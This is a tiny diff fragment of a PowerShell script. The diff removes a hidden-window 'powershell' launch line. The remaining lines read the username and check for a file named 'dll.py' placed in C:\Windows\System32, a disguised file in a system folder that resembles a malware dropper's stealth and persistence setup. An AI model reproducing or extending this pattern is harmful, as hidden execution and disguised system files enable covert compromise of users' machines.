@@ -1,4 +1,4 @@
-powershell -WindowStyle hidden
+
 $username = $env:UserName
 $dest = "C:\Windows\System32\dll.py"
 $bol1 = Test-Path -Path $dest
